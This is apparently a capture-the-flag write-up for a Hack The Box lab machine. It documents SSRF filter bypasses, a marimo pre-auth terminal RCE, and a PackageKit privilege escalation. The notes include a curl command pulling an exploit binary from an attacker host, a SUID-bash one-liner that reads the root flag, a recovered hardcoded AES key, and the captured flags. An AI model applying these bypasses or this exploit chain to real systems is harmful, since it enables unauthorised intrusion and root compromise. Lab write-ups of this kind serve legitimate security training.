# Cohort (HTB 933) — 10.129.244.174

## App identity
- **"Cohort Analytics"** — custom fictional marketing SPA + "Client Insights" portal. NOT a known product; no CVEs apply. Obfuscation is box flavor to hide the attack surface.
- Stack: **nginx 1.24.0 (Ubuntu)** reverse proxy → **Python stdlib `http.server` custom API** (confirmed via default 501 error page `Unsupported method ('OPTIONS')` and BaseHTTPRequestHandler error HTML; backend forges/passes `Server: nginx` through proxy).
- Client: vanilla JS SPA. `/assets/app.js` is obfuscated with **javascript-obfuscator** (string-array + RC4 + self-defending base64 check) AND the real app logic is an **AES-256-GCM encrypted blob** decrypted at runtime via WebCrypto, then `eval`'d. Key hardcoded in bundle: `NnB02s8+X30K3WtHOjWy4qXJ2F2ihnnSImL6X4GRyZQ=`, IV `fSc+LTJkAMJgRJbQ`. Decrypted payload: `loot/payload.js` (deob/decrypt tooling: `loot/deob2.js`, `loot/decrypt_payload.js`).

## Endpoint map (all via `--resolve cohort.htb:443:10.129.244.174 -k`)
| Path | Method | Status | Notes |
|---|---|---|---|
| `/` | GET | 200 | SPA shell, `data-page="home"`, 908 B |
| `/portal.html` | GET | 200 | SPA shell, `data-page="portal"` — "Register a report source URL" form |
| `/assets/app.js`, `/assets/styles.css` | GET | 200 | static |
| `/api` | GET | 301 | → `/api/` |
| `/api/*` | GET | 405 | `{"ok": false, "message": "Method not allowed."}` |
| **`/api/validate`** | **POST** | 200 | **THE endpoint.** JSON `{url, format}`; server fetches URL, reflects body |
| `/api/<unknown>` | POST | 404 | `{"ok": false, "message": "Not found."}` |
| `/api/validate` | OPTIONS | 501 | Python http.server default error page (backend fingerprint) |
| `/robots.txt`, `/sitemap.xml`, `/.git/HEAD`, `/.env`, `/graphql`, `/metrics`, ... | GET | 200 | all return the 908 B SPA shell (fallback masks everything) |
| `/favicon.ico` | GET | 404 | nginx default 404 |
| `/` on :80 | GET | 301 | → `https://cohort.htb/` |

## Auth model
- **None.** No login/register/reset forms, no cookies, no CSRF tokens, no rate limiting observed. Portal is fully open.

## /api/validate behavior (SSRF)
Request: `POST /api/validate {"url": "...", "format": "csv|json|ndjson|parquet"}`
Response envelope: `{"ok", "fetched_status", "content_type", "preview", "message"}` — **`preview` = full response body of the fetched URL** (no truncation at 4 KB tested).

Filter ("Internal or loopback addresses are not permitted."):
- BLOCKED: `127.0.0.1`, `localhost`, `[::1]`
- **BYPASSES CONFIRMED (all return internal content):**
  1. `http://0.0.0.0/` → fetches box's own nginx :80 ✔
  2. `http://2130706433/` (decimal 127.0.0.1) ✔
  3. Redirect: filter checks only the initial URL; fetcher **follows 302** anywhere ✔
  4. RFC1918 NOT blocked: fetched `http://10.10.15.143:8899/` (my VPN box) fine → internal 10.129.x services likely directly reachable
  5. Hostnames not DNS-checked: `http://cohort.htb/` allowed → any `*.cohort.htb` subdomain pointing at 127.0.0.1 sails through WITH correct Host header (vhost routing!)
- Scheme allowlist: http/https only (`"Only http and https sources are supported."`)
- `format` param not strictly validated server-side (`xml` accepted, fetch attempted)
- External fetch → 504 after ~15 s (no internet egress)
- Fetcher fingerprint: `User-Agent: CohortInsights/1.0 (+source-validator)`, `Accept-Encoding: identity`, `Connection: close`, no `Accept` — Python `urllib.request` style, follows redirects by default

## Suspected vulns (ranked)
1. **SSRF with full body reflection in `/api/validate`** — trivially bypassable filter (0.0.0.0 / decimal IP / redirect / RFC1918 / unresolves hostnames). This is the box's intended foothold. Use it to enumerate loopback/internal services.
2. Internal-service exposure behind nginx vhosts — wildcard cert `*.cohort.htb`; subdomains likely route to internal apps on loopback (ffuf vhost results pending separately). SSRF + `http://<sub>.cohort.htb/` (filter doesn't DNS-check) hits them with correct Host header.
3. Client bundle "secret" protection is cosmetic — hardcoded AES key; already recovered full source (`loot/payload.js`).

## Recommended attack path
1. **Port-scan loopback via SSRF**: `POST /api/validate {"url":"http://0.0.0.0:<port>/"}` — response time/`fetched_status`/`preview` distinguish open/closed. Prioritize 3000/5000/8000/8080/9000/8001-8999 and anything the ffuf vhost run hints at.
2. Pull internal app bodies via `preview`; look for creds, tokens, or an admin panel.
3. If a subdomain vhost is found (e.g. `internal.cohort.htb` → 127.0.0.1), fetch `http://<sub>.cohort.htb/` directly through the validator — filter won't stop it.
4. Creds → SSH (22, OpenSSH 9.6p1). No other external surface exists.

## Loot
- `loot/root.html`, `loot/portal.html` — SPA shells
- `loot/app.js` (obfuscated), `loot/app.deob.js`, `loot/app.folded.js`, `loot/decoded_strings.txt`
- `loot/payload.js` — **decrypted real client source**
- `loot/deob2.js`, `loot/decrypt_payload.js` — tooling
- `loot/ua_server.py` — probe server used for UA/redirect tests
- `loot/ssrf_scan_results.txt` — loopback ports 80/443/5000/8888 open
- `loot/marimo_term_exploit.py` — pre-auth marimo terminal RCE (CVE-2026-39987)

## Attack chain (completed)

### 1. SSRF foothold — `/api/validate`
- Loopback scan via `http://0.0.0.0:<port>/` found **5000** (Python insights API) and **8888** (marimo 0.20.4).
- Nginx `/status` (loopback-only) leaked upstream map: hidden vhost `nb-1be3782a8afd3ad5.cohort.htb` → `127.0.0.1:8888`.

### 2. User — marimo pre-auth RCE (CVE-2026-39987)
- marimo 0.20.4 exposes `/terminal/ws` without `validate_auth()`; reachable through nginx vhost (WebSocket upgrade).
- `loot/marimo_term_exploit.py` patches `getaddrinfo` to resolve vhost → box IP (no `/etc/hosts` needed).
- Shell as **marimo** (uid 1000); user flag: `171c42feba41aac0107509687fef9de3` (`/home/marimo/user.txt`).

### 3. Root — PackageKit TOCTOU (CVE-2026-41651 / Pack2TheRoot)
- `packagekit` **1.2.8-2ubuntu1.2** installed (vulnerable range 1.0.2–1.3.4); `pkcon --version` → 1.2.8.
- No sudo for marimo; standard SUID only; **sysmon** + **laurel** audit logging present but not the privesc vector.
- Exploit: [Vozec/CVE-2026-41651](https://github.com/Vozec/CVE-2026-41651) — chains two async `InstallFiles` D-Bus calls (SIMULATE bypass → flag overwrite → dpkg installs malicious `.deb` with SUID `/tmp/.suid_bash`).
- Transfer: `curl http://<attacker>:8897/cve-2026-41651` from marimo shell; run binary → SUID bash in ~3s.
- Root flag: `8a23019480f89f1d845adb95d3948ea8` (`/root/root.txt`).

```bash
# privesc one-liner after exploit lands
/tmp/.suid_bash -p -c 'cat /root/root.txt'
```

### Flags submitted
| Flag | Hash |
|------|------|
| user | `171c42feba41aac0107509687fef9de3` |
| root | `8a23019480f89f1d845adb95d3948ea8` |
